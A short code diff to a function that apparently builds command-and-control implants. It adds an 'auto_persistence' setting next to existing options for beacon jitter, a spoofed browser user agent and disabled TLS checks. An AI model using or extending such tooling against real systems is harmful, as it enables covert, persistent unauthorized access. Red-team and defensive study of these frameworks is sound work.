@@ -244,6 +244,7 @@ def build_agent():
     jitter = data.get('jitter', 5)
     user_agent = data.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
     insecure_tls = data.get('insecure_tls', True)
+    auto_persistence = data.get('auto_persistence', False)
     goos = data.get('goos', 'windows')
     goarch = data.get('goarch', 'amd64')
 
@@ -268,6 +269,7 @@ def build_agent():
     agent_code = agent_code.replace('{{ .Jitter }}', str(jitter))
     agent_code = agent_code.replace('{{ .UserAgent }}', user_agent)
     agent_code = agent_code.replace('{{ .InsecureTLS }}', str(insecure_tls).lower())
+    agent_code = agent_code.replace('{{ .AutoPersistence }}', str(auto_persistence).lower())
 
     # Create temporary directory
     temp_dir = tempfile.mkdtemp()
